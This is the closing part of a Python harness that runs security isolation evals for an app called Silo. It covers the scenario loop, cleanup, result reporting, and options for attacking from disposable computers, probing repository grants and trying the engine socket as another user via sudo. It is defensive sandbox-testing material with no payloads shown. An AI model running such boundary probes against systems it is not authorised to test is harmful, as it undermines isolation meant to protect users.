        if needs_secret and not args.no_secrets:
            print("Adding a disposable secret and restarting the computer…", flush=True)
            try:
                setup_secret(ctx)
                ctx.computer = client.computer_by_name(args.computer)
            except (EngineError, RuntimeError, TimeoutError) as error:
                ctx.secret_error = str(error)
        for scenario in selected:
            print(f"→ {scenario.id}: {scenario.title}", flush=True)
            result = Result(scenario)
            started = time.monotonic()
            try:
                scenario.run(ctx, result)
            except Exception as error:  # an eval bug must not hide the other results
                result.set("error", f"{type(error).__name__}: {error}")
                result.evidence["traceback"] = traceback.format_exc()[-3000:]
            result.seconds = time.monotonic() - started
            print(f"  {result.verdict}: {result.summary}", flush=True)
            results.append(result)
    finally:
        for cleanup in reversed(ctx.cleanups):
            try:
                cleanup()
            except Exception as error:  # keep cleaning up
                print(f"cleanup step failed: {error}", file=sys.stderr)
        client.close()
    meta = {
        "date": dt.date.today().isoformat(),
        "commit": git_commit(),
        "appVersion": app_version(args.app),
        "protocol": client.handshake.get("protocol"),
        "macos": platform.mac_ver()[0] or platform.platform(),
        "machine": platform.machine(),
        "computer": args.computer,
        "peer": args.peer,
    }
    report = write_results(meta, results, Path(args.results))
    print(f"\nResults: {report}")
    return 1 if any(r.verdict in ("fail", "error") for r in results) else 0


def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run Silo's isolation evals against disposable computers.")
    parser.add_argument("--computer", default=f"{EVAL_PREFIX}-a", help="running Linux computer to attack from (default: %(default)s)")
    parser.add_argument("--peer", default=None, help="second running Linux computer for computer-to-computer checks")
    parser.add_argument("--github-readable", metavar="OWNER/REPO", help="repository granted read-only to --computer")
    parser.add_argument("--github-ungranted", metavar="OWNER/REPO", help="repository you can push to that is NOT granted to --computer")
    parser.add_argument("--other-user", metavar="USER", help="also try the engine socket as this user via `sudo -n -u`")
    parser.add_argument("--no-secrets", action="store_true", help="skip the scenarios that add a disposable secret")
    parser.add_argument("--only", nargs="*", choices=[s.id for s in SCENARIOS], help="run only these scenarios")
    parser.add_argument("--channel", choices=["production", "development"], default="production")
    parser.add_argument("--app", default="/Applications/Silo.app", help="app bundle to record the version of")
    parser.add_argument("--results", default=str(RESULTS), help="where to write results (default: docs/evals/results)")
    parser.add_argument("--scan-timeout", type=float, default=1800, help="seconds allowed for the guest filesystem scan")
    # Used by the self-tests, which point the scan at a small directory.
    parser.add_argument("--scan-root", default="/", help=argparse.SUPPRESS)
    parser.add_argument("--scan-min-files", type=int, default=1000, help=argparse.SUPPRESS)
    parser.add_argument("--allow-any-computer", action="store_true", help="allow computers not named silo-eval-*")
    parser.add_argument("--list", action="store_true", help="list scenarios and exit")
    return parser.parse_args(argv)


def main(argv: Optional[List[str]] = None) -> int:
    args = parse_args(argv)
    if args.list:
        for s in SCENARIOS:
            print(f"{s.id:22} expected {s.expected:10} {s.title}")
        return 0
    return run(args)


if __name__ == "__main__":
    sys.exit(main())
